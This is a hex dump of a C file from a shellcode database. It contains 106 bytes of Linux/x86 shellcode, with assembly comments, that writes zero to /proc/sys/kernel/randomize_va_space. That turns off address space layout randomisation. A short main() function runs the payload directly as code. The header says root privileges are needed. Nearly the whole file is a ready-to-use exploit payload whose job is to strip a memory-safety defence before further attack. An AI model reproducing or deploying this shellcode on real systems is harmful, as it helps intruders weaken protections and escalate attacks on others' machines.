00000000  2f 2a 0a 54 69 74 6c 65  3a 09 20 4c 69 6e 75 78  |/*.Title:. Linux|
00000010  2f 78 38 36 20 2d 20 44  69 73 61 62 6c 65 20 72  |/x86 - Disable r|
00000020  61 6e 64 6f 6d 69 7a 65  20 73 74 61 63 6b 20 61  |andomize stack a|
00000030  64 64 72 65 73 73 65 20  2d 20 31 30 36 20 62 79  |ddresse - 106 by|
00000040  74 65 73 0a 20 20 20 20  20 20 20 20 20 28 53 65  |tes.         (Se|
00000050  74 20 72 61 6e 64 6f 6d  69 7a 65 5f 76 61 5f 73  |t randomize_va_s|
00000060  70 61 63 65 20 74 6f 20  7a 65 72 6f 29 20 0a 41  |pace to zero) .A|
00000070  75 74 68 6f 72 3a 20 20  4a 6f 6e 61 74 68 61 6e  |uthor:  Jonathan|
00000080  20 53 61 6c 77 61 6e 20  3c 73 75 62 6d 69 74 20  | Salwan <submit |
00000090  28 21 29 20 73 68 65 6c  6c 2d 73 74 6f 72 6d 2e  |(!) shell-storm.|
000000a0  6f 72 67 3e 0a 57 65 62  3a 20 20 20 20 20 68 74  |org>.Web:     ht|
000000b0  74 70 3a 2f 2f 77 77 77  2e 73 68 65 6c 6c 2d 73  |tp://www.shell-s|
000000c0  74 6f 72 6d 2e 6f 72 67  0a 54 77 69 74 74 65 72  |torm.org.Twitter|
000000d0  3a 20 68 74 74 70 3a 2f  2f 74 77 69 74 74 65 72  |: http://twitter|
000000e0  2e 63 6f 6d 2f 6a 6f 6e  61 74 68 61 6e 73 61 6c  |.com/jonathansal|
000000f0  77 61 6e 0a 0a 21 44 61  74 61 62 61 73 65 20 6f  |wan..!Database o|
00000100  66 20 53 68 65 6c 6c 63  6f 64 65 73 20 68 74 74  |f Shellcodes htt|
00000110  70 3a 2f 2f 77 77 77 2e  73 68 65 6c 6c 2d 73 74  |p://www.shell-st|
00000120  6f 72 6d 2e 6f 72 67 2f  73 68 65 6c 6c 63 6f 64  |orm.org/shellcod|
00000130  65 2f 0a 0a 44 61 74 65  3a 09 20 32 30 31 30 2d  |e/..Date:. 2010-|
00000140  30 35 2d 32 35 0a 54 65  73 74 65 64 3a 20 20 4c  |05-25.Tested:  L|
00000150  69 6e 75 78 20 32 2e 36  2e 33 33 20 2d 20 69 36  |inux 2.6.33 - i6|
00000160  38 36 0a 0a 21 20 59 6f  75 20 6e 65 65 64 20 72  |86..! You need r|
00000170  6f 6f 74 20 65 75 69 64  0a 2a 2f 0a 0a 0a 0a 23  |oot euid.*/....#|
00000180  69 6e 63 6c 75 64 65 20  3c 73 74 64 69 6f 2e 68  |include <stdio.h|
00000190  3e 0a 0a 63 68 61 72 20  73 63 5b 5d 20 3d 20 22  |>..char sc[] = "|
000001a0  5c 78 33 31 5c 78 64 62  22 20 20 20 20 20 20 20  |\x31\xdb"       |
000001b0  20 20 20 20 20 20 20 20  20 2f 2f 20 78 6f 72 20  |         // xor |
000001c0  20 20 20 25 65 62 78 2c  25 65 62 78 0a 20 20 20  |   %ebx,%ebx.   |
000001d0  20 20 20 20 20 20 20 20  20 22 5c 78 36 61 5c 78  |         "\x6a\x|
000001e0  36 31 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |61"             |
000001f0  20 20 20 2f 2f 20 70 75  73 68 20 20 20 24 30 78  |   // push   $0x|
00000200  36 31 0a 20 20 20 20 20  20 20 20 20 20 20 20 22  |61.            "|
00000210  5c 78 38 39 5c 78 65 33  22 20 20 20 20 20 20 20  |\x89\xe3"       |
00000220  20 20 20 20 20 20 20 20  20 2f 2f 20 6d 6f 76 20  |         // mov |
00000230  20 20 20 25 65 73 70 2c  25 65 62 78 0a 20 20 20  |   %esp,%ebx.   |
00000240  20 20 20 20 20 20 20 20  20 22 5c 78 62 30 5c 78  |         "\xb0\x|
00000250  30 61 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |0a"             |
00000260  20 20 20 2f 2f 20 6d 6f  76 20 20 20 20 24 30 78  |   // mov    $0x|
00000270  61 2c 25 61 6c 0a 20 20  20 20 20 20 20 20 20 20  |a,%al.          |
00000280  20 20 22 5c 78 63 64 5c  78 38 30 22 20 20 20 20  |  "\xcd\x80"    |
00000290  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 69  |            // i|
000002a0  6e 74 20 20 20 20 24 30  78 38 30 0a 20 20 20 20  |nt    $0x80.    |
000002b0  20 20 20 20 20 20 20 20  22 5c 78 33 31 5c 78 64  |        "\x31\xd|
000002c0  62 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |b"              |
000002d0  20 20 2f 2f 20 78 6f 72  20 20 20 20 25 65 62 78  |  // xor    %ebx|
000002e0  2c 25 65 62 78 0a 20 20  20 20 20 20 20 20 20 20  |,%ebx.          |
000002f0  20 20 22 5c 78 36 61 5c  78 36 35 22 20 20 20 20  |  "\x6a\x65"    |
00000300  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 70  |            // p|
00000310  75 73 68 20 20 20 24 30  78 36 35 0a 20 20 20 20  |ush   $0x65.    |
00000320  20 20 20 20 20 20 20 20  22 5c 78 36 36 5c 78 36  |        "\x66\x6|
00000330  38 5c 78 36 31 5c 78 36  33 22 20 20 20 20 20 20  |8\x61\x63"      |
00000340  20 20 2f 2f 20 70 75 73  68 77 20 20 24 30 78 36  |  // pushw  $0x6|
00000350  33 36 31 0a 20 20 20 20  20 20 20 20 20 20 20 20  |361.            |
00000360  22 5c 78 36 38 5c 78 36  31 5c 78 35 66 5c 78 37  |"\x68\x61\x5f\x7|
00000370  33 5c 78 37 30 22 20 20  20 20 2f 2f 20 70 75 73  |3\x70"    // pus|
00000380  68 20 20 20 24 30 78 37  30 37 33 35 66 36 31 0a  |h   $0x70735f61.|
00000390  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 36  |            "\x6|
000003a0  38 5c 78 37 61 5c 78 36  35 5c 78 35 66 5c 78 37  |8\x7a\x65\x5f\x7|
000003b0  36 22 20 20 20 20 2f 2f  20 70 75 73 68 20 20 20  |6"    // push   |
000003c0  24 30 78 37 36 35 66 36  35 37 61 0a 20 20 20 20  |$0x765f657a.    |
000003d0  20 20 20 20 20 20 20 20  22 5c 78 36 38 5c 78 36  |        "\x68\x6|
000003e0  34 5c 78 36 66 5c 78 36  64 5c 78 36 39 22 20 20  |4\x6f\x6d\x69"  |
000003f0  20 20 2f 2f 20 70 75 73  68 20 20 20 24 30 78 36  |  // push   $0x6|
00000400  39 36 64 36 66 36 34 0a  20 20 20 20 20 20 20 20  |96d6f64.        |
00000410  20 20 20 20 22 5c 78 36  38 5c 78 32 66 5c 78 37  |    "\x68\x2f\x7|
00000420  32 5c 78 36 31 5c 78 36  65 22 20 20 20 20 2f 2f  |2\x61\x6e"    //|
00000430  20 70 75 73 68 20 20 20  24 30 78 36 65 36 31 37  | push   $0x6e617|
00000440  32 32 66 0a 20 20 20 20  20 20 20 20 20 20 20 20  |22f.            |
00000450  22 5c 78 36 38 5c 78 37  32 5c 78 36 65 5c 78 36  |"\x68\x72\x6e\x6|
00000460  35 5c 78 36 63 22 20 20  20 20 2f 2f 20 70 75 73  |5\x6c"    // pus|
00000470  68 20 20 20 24 30 78 36  63 36 35 36 65 37 32 0a  |h   $0x6c656e72.|
00000480  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 36  |            "\x6|
00000490  38 5c 78 37 33 5c 78 32  66 5c 78 36 62 5c 78 36  |8\x73\x2f\x6b\x6|
000004a0  35 22 20 20 20 20 2f 2f  20 70 75 73 68 20 20 20  |5"    // push   |
000004b0  24 30 78 36 35 36 62 32  66 37 33 0a 20 20 20 20  |$0x656b2f73.    |
000004c0  20 20 20 20 20 20 20 20  22 5c 78 36 38 5c 78 36  |        "\x68\x6|
000004d0  33 5c 78 32 66 5c 78 37  33 5c 78 37 39 22 20 20  |3\x2f\x73\x79"  |
000004e0  20 20 2f 2f 20 70 75 73  68 20 20 20 24 30 78 37  |  // push   $0x7|
000004f0  39 37 33 32 66 36 33 0a  20 20 20 20 20 20 20 20  |9732f63.        |
00000500  20 20 20 20 22 5c 78 36  38 5c 78 32 66 5c 78 37  |    "\x68\x2f\x7|
00000510  30 5c 78 37 32 5c 78 36  66 22 20 20 20 20 2f 2f  |0\x72\x6f"    //|
00000520  20 70 75 73 68 20 20 20  24 30 78 36 66 37 32 37  | push   $0x6f727|
00000530  30 32 66 0a 20 20 20 20  20 20 20 20 20 20 20 20  |02f.            |
00000540  22 5c 78 38 39 5c 78 65  33 22 20 20 20 20 20 20  |"\x89\xe3"      |
00000550  20 20 20 20 20 20 20 20  20 20 2f 2f 20 6d 6f 76  |          // mov|
00000560  20 20 20 20 25 65 73 70  2c 25 65 62 78 0a 20 20  |    %esp,%ebx.  |
00000570  20 20 20 20 20 20 20 20  20 20 22 5c 78 33 30 5c  |          "\x30\|
00000580  78 63 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |xc0"            |
00000590  20 20 20 20 2f 2f 20 78  6f 72 20 20 20 20 25 61  |    // xor    %a|
000005a0  6c 2c 25 61 6c 0a 20 20  20 20 20 20 20 20 20 20  |l,%al.          |
000005b0  20 20 22 5c 78 62 30 5c  78 31 31 22 20 20 20 20  |  "\xb0\x11"    |
000005c0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 6d  |            // m|
000005d0  6f 76 20 20 20 20 24 30  78 31 31 2c 25 61 6c 0a  |ov    $0x11,%al.|
000005e0  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 33  |            "\x3|
000005f0  31 5c 78 63 39 22 20 20  20 20 20 20 20 20 20 20  |1\xc9"          |
00000600  20 20 20 20 20 20 2f 2f  20 78 6f 72 20 20 20 20  |      // xor    |
00000610  25 65 63 78 2c 25 65 63  78 0a 20 20 20 20 20 20  |%ecx,%ecx.      |
00000620  20 20 20 20 20 20 22 5c  78 36 36 5c 78 62 39 5c  |      "\x66\xb9\|
00000630  78 34 31 5c 78 30 34 22  20 20 20 20 20 20 20 20  |x41\x04"        |
00000640  2f 2f 20 6d 6f 76 20 20  20 20 24 30 78 34 34 31  |// mov    $0x441|
00000650  2c 25 63 78 0a 20 20 20  20 20 20 20 20 20 20 20  |,%cx.           |
00000660  20 22 5c 78 33 31 5c 78  64 32 22 20 20 20 20 20  | "\x31\xd2"     |
00000670  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 78 6f  |           // xo|
00000680  72 20 20 20 20 25 65 64  78 2c 25 65 64 78 0a 20  |r    %edx,%edx. |
00000690  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 36 36  |           "\x66|
000006a0  5c 78 62 61 5c 78 61 34  5c 78 30 31 22 20 20 20  |\xba\xa4\x01"   |
000006b0  20 20 20 20 20 2f 2f 20  6d 6f 76 20 20 20 20 24  |     // mov    $|
000006c0  30 78 31 61 34 2c 25 64  78 0a 20 20 20 20 20 20  |0x1a4,%dx.      |
000006d0  20 20 20 20 20 20 22 5c  78 33 31 5c 78 63 30 22  |      "\x31\xc0"|
000006e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006f0  2f 2f 20 78 6f 72 20 20  20 20 25 65 61 78 2c 25  |// xor    %eax,%|
00000700  65 61 78 0a 20 20 20 20  20 20 20 20 20 20 20 20  |eax.            |
00000710  22 5c 78 62 30 5c 78 30  35 22 20 20 20 20 20 20  |"\xb0\x05"      |
00000720  20 20 20 20 20 20 20 20  20 20 2f 2f 20 6d 6f 76  |          // mov|
00000730  20 20 20 20 24 30 78 35  2c 25 61 6c 0a 20 20 20  |    $0x5,%al.   |
00000740  20 20 20 20 20 20 20 20  20 22 5c 78 63 64 5c 78  |         "\xcd\x|
00000750  38 30 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |80"             |
00000760  20 20 20 2f 2f 20 69 6e  74 20 20 20 20 24 30 78  |   // int    $0x|
00000770  38 30 0a 20 20 20 20 20  20 20 20 20 20 20 20 22  |80.            "|
00000780  5c 78 38 39 5c 78 63 33  22 20 20 20 20 20 20 20  |\x89\xc3"       |
00000790  20 20 20 20 20 20 20 20  20 2f 2f 20 6d 6f 76 20  |         // mov |
000007a0  20 20 20 25 65 61 78 2c  25 65 62 78 0a 20 20 20  |   %eax,%ebx.   |
000007b0  20 20 20 20 20 20 20 20  20 22 5c 78 33 31 5c 78  |         "\x31\x|
000007c0  63 39 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |c9"             |
000007d0  20 20 20 2f 2f 20 78 6f  72 20 20 20 20 25 65 63  |   // xor    %ec|
000007e0  78 2c 25 65 63 78 0a 20  20 20 20 20 20 20 20 20  |x,%ecx.         |
000007f0  20 20 20 22 5c 78 36 36  5c 78 36 38 5c 78 33 30  |   "\x66\x68\x30|
00000800  5c 78 30 61 22 20 20 20  20 20 20 20 20 2f 2f 20  |\x0a"        // |
00000810  70 75 73 68 77 20 20 24  30 78 61 33 30 0a 20 20  |pushw  $0xa30.  |
00000820  20 20 20 20 20 20 20 20  20 20 22 5c 78 38 39 5c  |          "\x89\|
00000830  78 65 31 22 20 20 20 20  20 20 20 20 20 20 20 20  |xe1"            |
00000840  20 20 20 20 2f 2f 20 6d  6f 76 20 20 20 20 25 65  |    // mov    %e|
00000850  73 70 2c 25 65 63 78 0a  20 20 20 20 20 20 20 20  |sp,%ecx.        |
00000860  20 20 20 20 22 5c 78 33  31 5c 78 64 32 22 20 20  |    "\x31\xd2"  |
00000870  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000880  20 78 6f 72 20 20 20 20  25 65 64 78 2c 25 65 64  | xor    %edx,%ed|
00000890  78 0a 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |x.            "\|
000008a0  78 62 32 5c 78 30 32 22  20 20 20 20 20 20 20 20  |xb2\x02"        |
000008b0  20 20 20 20 20 20 20 20  2f 2f 20 6d 6f 76 20 20  |        // mov  |
000008c0  20 20 24 30 78 32 2c 25  64 6c 0a 20 20 20 20 20  |  $0x2,%dl.     |
000008d0  20 20 20 20 20 20 20 22  5c 78 33 31 5c 78 63 30  |       "\x31\xc0|
000008e0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000008f0  20 2f 2f 20 78 6f 72 20  20 20 20 25 65 61 78 2c  | // xor    %eax,|
00000900  25 65 61 78 0a 20 20 20  20 20 20 20 20 20 20 20  |%eax.           |
00000910  20 22 5c 78 62 30 5c 78  30 34 22 20 20 20 20 20  | "\xb0\x04"     |
00000920  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 6d 6f  |           // mo|
00000930  76 20 20 20 20 24 30 78  34 2c 25 61 6c 0a 20 20  |v    $0x4,%al.  |
00000940  20 20 20 20 20 20 20 20  20 20 22 5c 78 63 64 5c  |          "\xcd\|
00000950  78 38 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |x80"            |
00000960  20 20 20 20 2f 2f 20 69  6e 74 20 20 20 20 24 30  |    // int    $0|
00000970  78 38 30 0a 20 20 20 20  20 20 20 20 20 20 20 20  |x80.            |
00000980  22 5c 78 62 30 5c 78 30  31 22 20 20 20 20 20 20  |"\xb0\x01"      |
00000990  20 20 20 20 20 20 20 20  20 20 2f 2f 20 6d 6f 76  |          // mov|
000009a0  20 20 20 20 24 30 78 31  2c 25 61 6c 0a 20 20 20  |    $0x1,%al.   |
000009b0  20 20 20 20 20 20 20 20  20 22 5c 78 63 64 5c 78  |         "\xcd\x|
000009c0  38 30 22 3b 20 20 20 20  20 20 20 20 20 20 20 20  |80";            |
000009d0  20 20 20 2f 2f 20 69 6e  74 20 20 20 20 24 30 78  |   // int    $0x|
000009e0  38 30 0a 0a 69 6e 74 20  6d 61 69 6e 28 76 6f 69  |80..int main(voi|
000009f0  64 29 0a 7b 0a 20 20 20  20 20 20 20 20 66 70 72  |d).{.        fpr|
00000a00  69 6e 74 66 28 73 74 64  6f 75 74 2c 22 4c 65 6e  |intf(stdout,"Len|
00000a10  67 74 68 3a 20 25 64 5c  6e 22 2c 73 74 72 6c 65  |gth: %d\n",strle|
00000a20  6e 28 73 63 29 29 3b 0a  20 20 20 20 20 20 20 20  |n(sc));.        |
00000a30  28 2a 28 76 6f 69 64 28  2a 29 28 29 29 20 73 63  |(*(void(*)()) sc|
00000a40  29 28 29 3b 0a 0a 72 65  74 75 72 6e 20 30 3b 0a  |)();..return 0;.|
00000a50  7d                                                |}|
00000a51
